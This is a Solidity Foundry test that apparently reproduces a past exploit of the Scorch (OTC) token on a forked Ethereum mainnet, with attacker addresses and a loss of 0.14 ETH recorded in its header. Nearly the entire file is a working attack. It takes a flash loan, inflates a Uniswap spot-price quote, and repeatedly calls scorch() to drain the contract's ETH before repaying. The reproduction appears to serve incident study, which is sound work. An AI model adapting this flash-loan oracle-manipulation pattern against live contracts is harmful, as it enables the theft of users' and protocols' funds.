// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 0.14 ETH
// Attacker : 0xc9A5643eD8E4CD68d16FE779D378C0E8e7225A54
// Attack Contract : 0x60E1a5714AB98f4ba55811c45899Fb425433BB65
// Vulnerable Contract : 0xA3D0e72c8A2fE9127A77412BF34bEe5e4945bd49
// Attack Tx : https://etherscan.io/tx/0x02dc4409af99de400b2427dad525c31467a8fd2ac6cb251f885d33c073510ba2
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xa3d0e72c8a2fe9127a77412bf34bee5e4945bd49#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/451
//
// Scorch.scorch() paid ETH using a live Uniswap getAmountsOut() quote from the
// manipulable OTC/WETH pool. The attacker inflated the quote with a WETH->OTC swap,
// burned OTC for ETH at the inflated quote, then sold the remaining OTC and repaid.

address constant ATTACKER = 0xc9A5643eD8E4CD68d16FE779D378C0E8e7225A54;
address constant ATTACK_CONTRACT = 0x60E1a5714AB98f4ba55811c45899Fb425433BB65;
address constant SCORCH_TOKEN = 0xA3D0e72c8A2fE9127A77412BF34bEe5e4945bd49;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UNISWAP_V3_FLASH_POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

interface IScorch {
    function scorch(
        uint256 amount
    ) external returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    IUniswapV3Flash private constant flashPool = IUniswapV3Flash(UNISWAP_V3_FLASH_POOL);
    IUniswapV2Router private constant router = IUniswapV2Router(payable(UNISWAP_V2_ROUTER));
    IScorch private constant scorchToken = IScorch(SCORCH_TOKEN);
    IERC20 private constant otc = IERC20(SCORCH_TOKEN);
    IWETH private constant weth = IWETH(payable(WETH_TOKEN));

    function setUp() public {
        uint256 forkBlock = 21_822_423;
        vm.createSelectFork("mainnet", forkBlock);

        fundingToken = address(0);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(SCORCH_TOKEN, "Scorch OTC");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");
        vm.label(UNISWAP_V3_FLASH_POOL, "Uniswap V3 Flash Pool");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 balanceBefore = address(this).balance;

        flashPool.flash(address(this), 0, 4 ether, "");

        uint256 remainingWeth = weth.balanceOf(address(this));
        if (remainingWeth > 0) {
            weth.withdraw(remainingWeth);
        }

        assertGt(address(this).balance - balanceBefore, 0.1 ether);
    }

    function uniswapV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == UNISWAP_V3_FLASH_POOL, "unexpected callback");

        // step 1: buy OTC and inflate the OTC/WETH quote used by scorch().
        weth.approve(UNISWAP_V2_ROUTER, type(uint256).max);
        otc.approve(UNISWAP_V2_ROUTER, type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH_TOKEN;
        buyPath[1] = SCORCH_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(4 ether, 0, buyPath, address(this), block.timestamp);

        // step 2: repeatedly burn OTC while the manipulated quote drains Scorch's ETH.
        address[] memory quotePath = new address[](2);
        quotePath[0] = SCORCH_TOKEN;
        quotePath[1] = WETH_TOKEN;
        for (uint256 i = 0; i < 8; i++) {
            uint256 availableEth = SCORCH_TOKEN.balance;
            if (availableEth < 0.01 ether) break;

            uint256 targetReward = 0.097 ether;
            if (targetReward > availableEth) {
                targetReward = (availableEth * 95) / 100;
            }

            uint256 burnAmount = router.getAmountsIn(targetReward, quotePath)[0];
            scorchToken.scorch(burnAmount);
        }

        // step 3: sell remaining OTC to WETH and wrap the ETH rewards from scorch().
        uint256 remainingOtc = otc.balanceOf(address(this));
        address[] memory sellPath = new address[](2);
        sellPath[0] = SCORCH_TOKEN;
        sellPath[1] = WETH_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(remainingOtc, 0, sellPath, address(this), block.timestamp);

        if (address(this).balance > 0) {
            weth.deposit{value: address(this).balance}();
        }

        // step 4: repay the WETH flash loan.
        weth.transfer(UNISWAP_V3_FLASH_POOL, 4 ether + fee1);
    }

    receive() external payable {}
}
